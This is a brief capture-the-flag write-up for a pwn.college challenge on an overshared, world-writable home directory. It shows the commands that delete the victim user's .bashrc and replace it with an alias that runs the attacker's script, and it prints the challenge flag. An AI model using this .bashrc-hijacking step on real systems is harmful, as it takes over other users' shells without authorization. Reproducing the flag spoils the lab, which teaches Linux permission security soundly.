### Overshared Directories 

In this challenge, for convenience, Zardus opened up his home directory:

```console
zardus@dojo:~$ chmod a+w /home/zardus
```

As you know, there are lots of sensitive files in that directory _such as `.bashrc`_! Can you replicate the previous attack with write access to `/home/zardus` instead of `/home/zardus/.bashrc`?

**flag:** `pwn.college{wBNZwRocFD3RXPvgE9EwmuvfFaV.0FM0EzNxwyNwkzNyEzW}`

What did I do? :
- `rm /home/zardus/.bashrc`
- `echo "alias flag_checker='bash /home/hacker/flag_checker'" > /home/zardus/.bashrc`
- `/challenge/victim`

First of all I removed the existing zardus bashrc, then added an alias which runs the flag_checker to the bashrc. Running /challenge/victim gave me the flag.


